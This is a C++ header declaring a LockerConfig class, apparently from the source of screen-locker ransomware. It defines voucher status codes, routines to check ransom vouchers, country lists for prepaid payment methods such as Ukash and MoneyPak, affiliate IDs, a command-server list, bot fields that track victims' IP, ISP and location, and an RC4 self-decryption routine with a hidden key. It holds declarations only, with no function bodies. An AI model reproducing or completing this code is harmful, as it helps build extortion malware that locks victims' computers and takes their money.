#ifndef __LOCKER_CONFIG_H_
#define __LOCKER_CONFIG_H_

class LockerConfig
{
public:
    enum VoucherSatatus {
        Uninitialized = -1,
        InProgress = 0,
        Good = 1,
        Invalid = 2,
        NeedNodeInfo = 777,
    };

    LockerConfig();
    ~LockerConfig();

    bool loadConfig();

    void arc4_crypt_self(uint8_t* buffer, uint32_t length);

    bool parseNodeParams(const zgui::String& params);
    bool parseVoucherStatus(const zgui::String& vStatus);
    bool parseVouchersInfo(const zgui::String& vInfos);

    bool checkAndPrepareVoucher(const zgui::String& voucherNum, int voucherType);
    void addVoucherAsUsed(const zgui::String& voucherNum);

    uint32_t affId;
    uint32_t subId;
    uint32_t osMajorVer;        // Major version of system
    uint32_t osMinorVer;        // Minor version of system
    uint32_t osSp;              // Service pack version
    uint32_t osBuildNumber;     // Build number
    uint32_t osProductType;     // Product type (Workstation, Server, ...)
    int osIs64;
    uint32_t sysLangId;
//    String sysCountry;
    zgui::StringArray servers;
    int currentServer;

    zgui::StringArray pscCountries;
    zgui::StringArray ukashCountries;
    zgui::StringArray mpakCountries;
    zgui::StringArray dollarCountries;
    zgui::StringArray euroCountries;
    zgui::StringArray poundCountries;
    zgui::String botId;
    zgui::String botIp;
    zgui::String botCountry;
    zgui::String botCountryCode;
    zgui::String botCity;
    zgui::String botISP;
    zgui::String botOrg;

    zgui::MemoryBlock _srvResources;

    zgui::String activeVoucher;
    int activeVoucherType;
    uint32_t waitTimeout;
    int activeVoucherStatus;
    zgui::StringArray _badVouchers;
    zgui::Array<int> _badVoucherTypes;

    zgui_DeclareSingleton(LockerConfig)

private:
    char _key[65];
    uint32_t _keylen;
private:
};

#endif // __LOCKER_CONFIG_H_
